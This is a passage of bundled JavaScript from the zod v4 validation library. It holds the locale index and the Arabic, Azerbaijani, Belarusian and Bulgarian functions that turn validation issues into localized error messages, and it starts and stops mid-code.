      inst,
      path: [...inst._zod.def.path ?? []],
      continue: !inst._zod.def.abort
    };
    if (inst._zod.def.params)
      _iss.params = inst._zod.def.params;
    payload.issues.push(issue(_iss));
  }
}
// node_modules/zod/v4/locales/index.js
var exports_locales = {};
__export(exports_locales, {
  zhTW: () => zh_TW_default,
  zhCN: () => zh_CN_default,
  yo: () => yo_default,
  vi: () => vi_default,
  uz: () => uz_default,
  ur: () => ur_default,
  uk: () => uk_default,
  ua: () => ua_default,
  tr: () => tr_default,
  th: () => th_default,
  ta: () => ta_default,
  sv: () => sv_default,
  sl: () => sl_default,
  ru: () => ru_default,
  pt: () => pt_default,
  ps: () => ps_default,
  pl: () => pl_default,
  ota: () => ota_default,
  no: () => no_default,
  nl: () => nl_default,
  ms: () => ms_default,
  mk: () => mk_default,
  lt: () => lt_default,
  ko: () => ko_default,
  km: () => km_default,
  kh: () => kh_default,
  ka: () => ka_default,
  ja: () => ja_default,
  it: () => it_default,
  is: () => is_default,
  id: () => id_default,
  hy: () => hy_default,
  hu: () => hu_default,
  he: () => he_default,
  frCA: () => fr_CA_default,
  fr: () => fr_default,
  fi: () => fi_default,
  fa: () => fa_default,
  es: () => es_default,
  eo: () => eo_default,
  en: () => en_default,
  de: () => de_default,
  da: () => da_default,
  cs: () => cs_default,
  ca: () => ca_default,
  bg: () => bg_default,
  be: () => be_default,
  az: () => az_default,
  ar: () => ar_default
});

// node_modules/zod/v4/locales/ar.js
var error = () => {
  const Sizable = {
    string: { unit: "\u062D\u0631\u0641", verb: "\u0623\u0646 \u064A\u062D\u0648\u064A" },
    file: { unit: "\u0628\u0627\u064A\u062A", verb: "\u0623\u0646 \u064A\u062D\u0648\u064A" },
    array: { unit: "\u0639\u0646\u0635\u0631", verb: "\u0623\u0646 \u064A\u062D\u0648\u064A" },
    set: { unit: "\u0639\u0646\u0635\u0631", verb: "\u0623\u0646 \u064A\u062D\u0648\u064A" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0645\u062F\u062E\u0644",
    email: "\u0628\u0631\u064A\u062F \u0625\u0644\u0643\u062A\u0631\u0648\u0646\u064A",
    url: "\u0631\u0627\u0628\u0637",
    emoji: "\u0625\u064A\u0645\u0648\u062C\u064A",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u062A\u0627\u0631\u064A\u062E \u0648\u0648\u0642\u062A \u0628\u0645\u0639\u064A\u0627\u0631 ISO",
    date: "\u062A\u0627\u0631\u064A\u062E \u0628\u0645\u0639\u064A\u0627\u0631 ISO",
    time: "\u0648\u0642\u062A \u0628\u0645\u0639\u064A\u0627\u0631 ISO",
    duration: "\u0645\u062F\u0629 \u0628\u0645\u0639\u064A\u0627\u0631 ISO",
    ipv4: "\u0639\u0646\u0648\u0627\u0646 IPv4",
    ipv6: "\u0639\u0646\u0648\u0627\u0646 IPv6",
    cidrv4: "\u0645\u062F\u0649 \u0639\u0646\u0627\u0648\u064A\u0646 \u0628\u0635\u064A\u063A\u0629 IPv4",
    cidrv6: "\u0645\u062F\u0649 \u0639\u0646\u0627\u0648\u064A\u0646 \u0628\u0635\u064A\u063A\u0629 IPv6",
    base64: "\u0646\u064E\u0635 \u0628\u062A\u0631\u0645\u064A\u0632 base64-encoded",
    base64url: "\u0646\u064E\u0635 \u0628\u062A\u0631\u0645\u064A\u0632 base64url-encoded",
    json_string: "\u0646\u064E\u0635 \u0639\u0644\u0649 \u0647\u064A\u0626\u0629 JSON",
    e164: "\u0631\u0642\u0645 \u0647\u0627\u062A\u0641 \u0628\u0645\u0639\u064A\u0627\u0631 E.164",
    jwt: "JWT",
    template_literal: "\u0645\u062F\u062E\u0644"
  };
  const TypeDictionary = {
    nan: "NaN"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u0645\u062F\u062E\u0644\u0627\u062A \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644\u0629: \u064A\u0641\u062A\u0631\u0636 \u0625\u062F\u062E\u0627\u0644 instanceof ${issue2.expected}\u060C \u0648\u0644\u0643\u0646 \u062A\u0645 \u0625\u062F\u062E\u0627\u0644 ${received}`;
        }
        return `\u0645\u062F\u062E\u0644\u0627\u062A \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644\u0629: \u064A\u0641\u062A\u0631\u0636 \u0625\u062F\u062E\u0627\u0644 ${expected}\u060C \u0648\u0644\u0643\u0646 \u062A\u0645 \u0625\u062F\u062E\u0627\u0644 ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u0645\u062F\u062E\u0644\u0627\u062A \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644\u0629: \u064A\u0641\u062A\u0631\u0636 \u0625\u062F\u062E\u0627\u0644 ${stringifyPrimitive(issue2.values[0])}`;
        return `\u0627\u062E\u062A\u064A\u0627\u0631 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644: \u064A\u062A\u0648\u0642\u0639 \u0627\u0646\u062A\u0642\u0627\u0621 \u0623\u062D\u062F \u0647\u0630\u0647 \u0627\u0644\u062E\u064A\u0627\u0631\u0627\u062A: ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return ` \u0623\u0643\u0628\u0631 \u0645\u0646 \u0627\u0644\u0644\u0627\u0632\u0645: \u064A\u0641\u062A\u0631\u0636 \u0623\u0646 \u062A\u0643\u0648\u0646 ${issue2.origin ?? "\u0627\u0644\u0642\u064A\u0645\u0629"} ${adj} ${issue2.maximum.toString()} ${sizing.unit ?? "\u0639\u0646\u0635\u0631"}`;
        return `\u0623\u0643\u0628\u0631 \u0645\u0646 \u0627\u0644\u0644\u0627\u0632\u0645: \u064A\u0641\u062A\u0631\u0636 \u0623\u0646 \u062A\u0643\u0648\u0646 ${issue2.origin ?? "\u0627\u0644\u0642\u064A\u0645\u0629"} ${adj} ${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u0623\u0635\u063A\u0631 \u0645\u0646 \u0627\u0644\u0644\u0627\u0632\u0645: \u064A\u0641\u062A\u0631\u0636 \u0644\u0640 ${issue2.origin} \u0623\u0646 \u064A\u0643\u0648\u0646 ${adj} ${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `\u0623\u0635\u063A\u0631 \u0645\u0646 \u0627\u0644\u0644\u0627\u0632\u0645: \u064A\u0641\u062A\u0631\u0636 \u0644\u0640 ${issue2.origin} \u0623\u0646 \u064A\u0643\u0648\u0646 ${adj} ${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `\u0646\u064E\u0635 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644: \u064A\u062C\u0628 \u0623\u0646 \u064A\u0628\u062F\u0623 \u0628\u0640 "${issue2.prefix}"`;
        if (_issue.format === "ends_with")
          return `\u0646\u064E\u0635 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644: \u064A\u062C\u0628 \u0623\u0646 \u064A\u0646\u062A\u0647\u064A \u0628\u0640 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u0646\u064E\u0635 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644: \u064A\u062C\u0628 \u0623\u0646 \u064A\u062A\u0636\u0645\u0651\u064E\u0646 "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u0646\u064E\u0635 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644: \u064A\u062C\u0628 \u0623\u0646 \u064A\u0637\u0627\u0628\u0642 \u0627\u0644\u0646\u0645\u0637 ${_issue.pattern}`;
        return `${FormatDictionary[_issue.format] ?? issue2.format} \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644`;
      }
      case "not_multiple_of":
        return `\u0631\u0642\u0645 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644: \u064A\u062C\u0628 \u0623\u0646 \u064A\u0643\u0648\u0646 \u0645\u0646 \u0645\u0636\u0627\u0639\u0641\u0627\u062A ${issue2.divisor}`;
      case "unrecognized_keys":
        return `\u0645\u0639\u0631\u0641${issue2.keys.length > 1 ? "\u0627\u062A" : ""} \u063A\u0631\u064A\u0628${issue2.keys.length > 1 ? "\u0629" : ""}: ${joinValues(issue2.keys, "\u060C ")}`;
      case "invalid_key":
        return `\u0645\u0639\u0631\u0641 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644 \u0641\u064A ${issue2.origin}`;
      case "invalid_union":
        return "\u0645\u062F\u062E\u0644 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644";
      case "invalid_element":
        return `\u0645\u062F\u062E\u0644 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644 \u0641\u064A ${issue2.origin}`;
      default:
        return "\u0645\u062F\u062E\u0644 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644";
    }
  };
};
function ar_default() {
  return {
    localeError: error()
  };
}
// node_modules/zod/v4/locales/az.js
var error2 = () => {
  const Sizable = {
    string: { unit: "simvol", verb: "olmal\u0131d\u0131r" },
    file: { unit: "bayt", verb: "olmal\u0131d\u0131r" },
    array: { unit: "element", verb: "olmal\u0131d\u0131r" },
    set: { unit: "element", verb: "olmal\u0131d\u0131r" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "input",
    email: "email address",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO datetime",
    date: "ISO date",
    time: "ISO time",
    duration: "ISO duration",
    ipv4: "IPv4 address",
    ipv6: "IPv6 address",
    cidrv4: "IPv4 range",
    cidrv6: "IPv6 range",
    base64: "base64-encoded string",
    base64url: "base64url-encoded string",
    json_string: "JSON string",
    e164: "E.164 number",
    jwt: "JWT",
    template_literal: "input"
  };
  const TypeDictionary = {
    nan: "NaN"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Yanl\u0131\u015F d\u0259y\u0259r: g\xF6zl\u0259nil\u0259n instanceof ${issue2.expected}, daxil olan ${received}`;
        }
        return `Yanl\u0131\u015F d\u0259y\u0259r: g\xF6zl\u0259nil\u0259n ${expected}, daxil olan ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Yanl\u0131\u015F d\u0259y\u0259r: g\xF6zl\u0259nil\u0259n ${stringifyPrimitive(issue2.values[0])}`;
        return `Yanl\u0131\u015F se\xE7im: a\u015Fa\u011F\u0131dak\u0131lardan biri olmal\u0131d\u0131r: ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\xC7ox b\xF6y\xFCk: g\xF6zl\u0259nil\u0259n ${issue2.origin ?? "d\u0259y\u0259r"} ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "element"}`;
        return `\xC7ox b\xF6y\xFCk: g\xF6zl\u0259nil\u0259n ${issue2.origin ?? "d\u0259y\u0259r"} ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\xC7ox ki\xE7ik: g\xF6zl\u0259nil\u0259n ${issue2.origin} ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        return `\xC7ox ki\xE7ik: g\xF6zl\u0259nil\u0259n ${issue2.origin} ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Yanl\u0131\u015F m\u0259tn: "${_issue.prefix}" il\u0259 ba\u015Flamal\u0131d\u0131r`;
        if (_issue.format === "ends_with")
          return `Yanl\u0131\u015F m\u0259tn: "${_issue.suffix}" il\u0259 bitm\u0259lidir`;
        if (_issue.format === "includes")
          return `Yanl\u0131\u015F m\u0259tn: "${_issue.includes}" daxil olmal\u0131d\u0131r`;
        if (_issue.format === "regex")
          return `Yanl\u0131\u015F m\u0259tn: ${_issue.pattern} \u015Fablonuna uy\u011Fun olmal\u0131d\u0131r`;
        return `Yanl\u0131\u015F ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Yanl\u0131\u015F \u0259d\u0259d: ${issue2.divisor} il\u0259 b\xF6l\xFCn\u0259 bil\u0259n olmal\u0131d\u0131r`;
      case "unrecognized_keys":
        return `Tan\u0131nmayan a\xE7ar${issue2.keys.length > 1 ? "lar" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `${issue2.origin} daxilind\u0259 yanl\u0131\u015F a\xE7ar`;
      case "invalid_union":
        return "Yanl\u0131\u015F d\u0259y\u0259r";
      case "invalid_element":
        return `${issue2.origin} daxilind\u0259 yanl\u0131\u015F d\u0259y\u0259r`;
      default:
        return `Yanl\u0131\u015F d\u0259y\u0259r`;
    }
  };
};
function az_default() {
  return {
    localeError: error2()
  };
}
// node_modules/zod/v4/locales/be.js
function getBelarusianPlural(count, one, few, many) {
  const absCount = Math.abs(count);
  const lastDigit = absCount % 10;
  const lastTwoDigits = absCount % 100;
  if (lastTwoDigits >= 11 && lastTwoDigits <= 19) {
    return many;
  }
  if (lastDigit === 1) {
    return one;
  }
  if (lastDigit >= 2 && lastDigit <= 4) {
    return few;
  }
  return many;
}
var error3 = () => {
  const Sizable = {
    string: {
      unit: {
        one: "\u0441\u0456\u043C\u0432\u0430\u043B",
        few: "\u0441\u0456\u043C\u0432\u0430\u043B\u044B",
        many: "\u0441\u0456\u043C\u0432\u0430\u043B\u0430\u045E"
      },
      verb: "\u043C\u0435\u0446\u044C"
    },
    array: {
      unit: {
        one: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442",
        few: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u044B",
        many: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u0430\u045E"
      },
      verb: "\u043C\u0435\u0446\u044C"
    },
    set: {
      unit: {
        one: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442",
        few: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u044B",
        many: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u0430\u045E"
      },
      verb: "\u043C\u0435\u0446\u044C"
    },
    file: {
      unit: {
        one: "\u0431\u0430\u0439\u0442",
        few: "\u0431\u0430\u0439\u0442\u044B",
        many: "\u0431\u0430\u0439\u0442\u0430\u045E"
      },
      verb: "\u043C\u0435\u0446\u044C"
    }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0443\u0432\u043E\u0434",
    email: "email \u0430\u0434\u0440\u0430\u0441",
    url: "URL",
    emoji: "\u044D\u043C\u043E\u0434\u0437\u0456",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \u0434\u0430\u0442\u0430 \u0456 \u0447\u0430\u0441",
    date: "ISO \u0434\u0430\u0442\u0430",
    time: "ISO \u0447\u0430\u0441",
    duration: "ISO \u043F\u0440\u0430\u0446\u044F\u0433\u043B\u0430\u0441\u0446\u044C",
    ipv4: "IPv4 \u0430\u0434\u0440\u0430\u0441",
    ipv6: "IPv6 \u0430\u0434\u0440\u0430\u0441",
    cidrv4: "IPv4 \u0434\u044B\u044F\u043F\u0430\u0437\u043E\u043D",
    cidrv6: "IPv6 \u0434\u044B\u044F\u043F\u0430\u0437\u043E\u043D",
    base64: "\u0440\u0430\u0434\u043E\u043A \u0443 \u0444\u0430\u0440\u043C\u0430\u0446\u0435 base64",
    base64url: "\u0440\u0430\u0434\u043E\u043A \u0443 \u0444\u0430\u0440\u043C\u0430\u0446\u0435 base64url",
    json_string: "JSON \u0440\u0430\u0434\u043E\u043A",
    e164: "\u043D\u0443\u043C\u0430\u0440 E.164",
    jwt: "JWT",
    template_literal: "\u0443\u0432\u043E\u0434"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u043B\u0456\u043A",
    array: "\u043C\u0430\u0441\u0456\u045E"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u045E\u0432\u043E\u0434: \u0447\u0430\u043A\u0430\u045E\u0441\u044F instanceof ${issue2.expected}, \u0430\u0442\u0440\u044B\u043C\u0430\u043D\u0430 ${received}`;
        }
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u045E\u0432\u043E\u0434: \u0447\u0430\u043A\u0430\u045E\u0441\u044F ${expected}, \u0430\u0442\u0440\u044B\u043C\u0430\u043D\u0430 ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u045E\u0432\u043E\u0434: \u0447\u0430\u043A\u0430\u043B\u0430\u0441\u044F ${stringifyPrimitive(issue2.values[0])}`;
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u0432\u0430\u0440\u044B\u044F\u043D\u0442: \u0447\u0430\u043A\u0430\u045E\u0441\u044F \u0430\u0434\u0437\u0456\u043D \u0437 ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          const maxValue = Number(issue2.maximum);
          const unit = getBelarusianPlural(maxValue, sizing.unit.one, sizing.unit.few, sizing.unit.many);
          return `\u0417\u0430\u043D\u0430\u0434\u0442\u0430 \u0432\u044F\u043B\u0456\u043A\u0456: \u0447\u0430\u043A\u0430\u043B\u0430\u0441\u044F, \u0448\u0442\u043E ${issue2.origin ?? "\u0437\u043D\u0430\u0447\u044D\u043D\u043D\u0435"} \u043F\u0430\u0432\u0456\u043D\u043D\u0430 ${sizing.verb} ${adj}${issue2.maximum.toString()} ${unit}`;
        }
        return `\u0417\u0430\u043D\u0430\u0434\u0442\u0430 \u0432\u044F\u043B\u0456\u043A\u0456: \u0447\u0430\u043A\u0430\u043B\u0430\u0441\u044F, \u0448\u0442\u043E ${issue2.origin ?? "\u0437\u043D\u0430\u0447\u044D\u043D\u043D\u0435"} \u043F\u0430\u0432\u0456\u043D\u043D\u0430 \u0431\u044B\u0446\u044C ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          const minValue = Number(issue2.minimum);
          const unit = getBelarusianPlural(minValue, sizing.unit.one, sizing.unit.few, sizing.unit.many);
          return `\u0417\u0430\u043D\u0430\u0434\u0442\u0430 \u043C\u0430\u043B\u044B: \u0447\u0430\u043A\u0430\u043B\u0430\u0441\u044F, \u0448\u0442\u043E ${issue2.origin} \u043F\u0430\u0432\u0456\u043D\u043D\u0430 ${sizing.verb} ${adj}${issue2.minimum.toString()} ${unit}`;
        }
        return `\u0417\u0430\u043D\u0430\u0434\u0442\u0430 \u043C\u0430\u043B\u044B: \u0447\u0430\u043A\u0430\u043B\u0430\u0441\u044F, \u0448\u0442\u043E ${issue2.origin} \u043F\u0430\u0432\u0456\u043D\u043D\u0430 \u0431\u044B\u0446\u044C ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u0440\u0430\u0434\u043E\u043A: \u043F\u0430\u0432\u0456\u043D\u0435\u043D \u043F\u0430\u0447\u044B\u043D\u0430\u0446\u0446\u0430 \u0437 "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u0440\u0430\u0434\u043E\u043A: \u043F\u0430\u0432\u0456\u043D\u0435\u043D \u0437\u0430\u043A\u0430\u043D\u0447\u0432\u0430\u0446\u0446\u0430 \u043D\u0430 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u0440\u0430\u0434\u043E\u043A: \u043F\u0430\u0432\u0456\u043D\u0435\u043D \u0437\u043C\u044F\u0448\u0447\u0430\u0446\u044C "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u0440\u0430\u0434\u043E\u043A: \u043F\u0430\u0432\u0456\u043D\u0435\u043D \u0430\u0434\u043F\u0430\u0432\u044F\u0434\u0430\u0446\u044C \u0448\u0430\u0431\u043B\u043E\u043D\u0443 ${_issue.pattern}`;
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u043B\u0456\u043A: \u043F\u0430\u0432\u0456\u043D\u0435\u043D \u0431\u044B\u0446\u044C \u043A\u0440\u0430\u0442\u043D\u044B\u043C ${issue2.divisor}`;
      case "unrecognized_keys":
        return `\u041D\u0435\u0440\u0430\u0441\u043F\u0430\u0437\u043D\u0430\u043D\u044B ${issue2.keys.length > 1 ? "\u043A\u043B\u044E\u0447\u044B" : "\u043A\u043B\u044E\u0447"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u043A\u043B\u044E\u0447 \u0443 ${issue2.origin}`;
      case "invalid_union":
        return "\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u045E\u0432\u043E\u0434";
      case "invalid_element":
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u0430\u0435 \u0437\u043D\u0430\u0447\u044D\u043D\u043D\u0435 \u045E ${issue2.origin}`;
      default:
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u045E\u0432\u043E\u0434`;
    }
  };
};
function be_default() {
  return {
    localeError: error3()
  };
}
// node_modules/zod/v4/locales/bg.js
var error4 = () => {
  const Sizable = {
    string: { unit: "\u0441\u0438\u043C\u0432\u043E\u043B\u0430", verb: "\u0434\u0430 \u0441\u044A\u0434\u044A\u0440\u0436\u0430" },
    file: { unit: "\u0431\u0430\u0439\u0442\u0430", verb: "\u0434\u0430 \u0441\u044A\u0434\u044A\u0440\u0436\u0430" },
    array: { unit: "\u0435\u043B\u0435\u043C\u0435\u043D\u0442\u0430", verb: "\u0434\u0430 \u0441\u044A\u0434\u044A\u0440\u0436\u0430" },
    set: { unit: "\u0435\u043B\u0435\u043C\u0435\u043D\u0442\u0430", verb: "\u0434\u0430 \u0441\u044A\u0434\u044A\u0440\u0436\u0430" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0432\u0445\u043E\u0434",
    email: "\u0438\u043C\u0435\u0439\u043B \u0430\u0434\u0440\u0435\u0441",
    url: "URL",
    emoji: "\u0435\u043C\u043E\u0434\u0436\u0438",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \u0432\u0440\u0435\u043C\u0435",
    date: "ISO \u0434\u0430\u0442\u0430",
    time: "ISO \u0432\u0440\u0435\u043C\u0435",
    duration: "ISO \u043F\u0440\u043E\u0434\u044A\u043B\u0436\u0438\u0442\u0435\u043B\u043D\u043E\u0441\u0442",
    ipv4: "IPv4 \u0430\u0434\u0440\u0435\u0441",
    ipv6: "IPv6 \u0430\u0434\u0440\u0435\u0441",
    cidrv4: "IPv4 \u0434\u0438\u0430\u043F\u0430\u0437\u043E\u043D",
    cidrv6: "IPv6 \u0434\u0438\u0430\u043F\u0430\u0437\u043E\u043D",
    base64: "base64-\u043A\u043E\u0434\u0438\u0440\u0430\u043D \u043D\u0438\u0437",
    base64url: "base64url-\u043A\u043E\u0434\u0438\u0440\u0430\u043D \u043D\u0438\u0437",
    json_string: "JSON \u043D\u0438\u0437",
    e164: "E.164 \u043D\u043E\u043C\u0435\u0440",
    jwt: "JWT",
    template_literal: "\u0432\u0445\u043E\u0434"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u0447\u0438\u0441\u043B\u043E",
    array: "\u043C\u0430\u0441\u0438\u0432"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u0435\u043D \u0432\u0445\u043E\u0434: \u043E\u0447\u0430\u043A\u0432\u0430\u043D instanceof ${issue2.expected}, \u043F\u043E\u043B\u0443\u0447\u0435\u043D ${received}`;
        }
        return `\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u0435\u043D \u0432\u0445\u043E\u0434: \u043E\u0447\u0430\u043A\u0432\u0430\u043D ${expected}, \u043F\u043E\u043B\u0443\u0447\u0435\u043D ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u0435\u043D \u0432\u0445\u043E\u0434: \u043E\u0447\u0430\u043A\u0432\u0430\u043D ${stringifyPrimitive(issue2.values[0])}`;
        return `\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u043D\u0430 \u043E\u043F\u0446\u0438\u044F: \u043E\u0447\u0430\u043A\u0432\u0430\u043D\u043E \u0435\u0434\u043D\u043E \u043E\u0442 ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\u0422\u0432\u044A\u0440\u0434\u0435 \u0433\u043E\u043B\u044F\u043C\u043E: \u043E\u0447\u0430\u043A\u0432\u0430 \u0441\u0435 ${issue2.origin ?? "\u0441\u0442\u043E\u0439\u043D\u043E\u0441\u0442"} \u0434\u0430 \u0441\u044A\u0434\u044A\u0440\u0436\u0430 ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "\u0435\u043B\u0435\u043C\u0435\u043D\u0442\u0430"}`;
        return `\u0422\u0432\u044A\u0440\u0434\u0435 \u0433\u043E\u043B\u044F\u043C\u043E: \u043E\u0447\u0430\u043A\u0432\u0430 \u0441\u0435 ${issue2.origin ?? "\u0441\u0442\u043E\u0439\u043D\u043E\u0441\u0442"} \u0434\u0430 \u0431\u044A\u0434\u0435 ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u0422\u0432\u044A\u0440\u0434\u0435 \u043C\u0430\u043B\u043A\u043E: \u043E\u0447\u0430\u043A\u0432\u0430 \u0441\u0435 ${issue2.origin} \u0434\u0430 \u0441\u044A\u0434\u044A\u0440\u0436\u0430 ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `\u0422\u0432\u044A\u0440\u0434\u0435 \u043C\u0430\u043B\u043A\u043E: \u043E\u0447\u0430\u043A\u0432\u0430 \u0441\u0435 ${issue2.origin} \u0434\u0430 \u0431\u044A\u0434\u0435 ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u0435\u043D \u043D\u0438\u0437: \u0442\u0440\u044F\u0431\u0432\u0430 \u0434\u0430 \u0437\u0430\u043F\u043E\u0447\u0432\u0430 \u0441 "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u0435\u043D \u043D\u0438\u0437: \u0442\u0440\u044F\u0431\u0432\u0430 \u0434\u0430 \u0437\u0430\u0432\u044A\u0440\u0448\u0432\u0430 \u0441 "${_issue.suffix}"`;
        if (_issue.format === "includes")
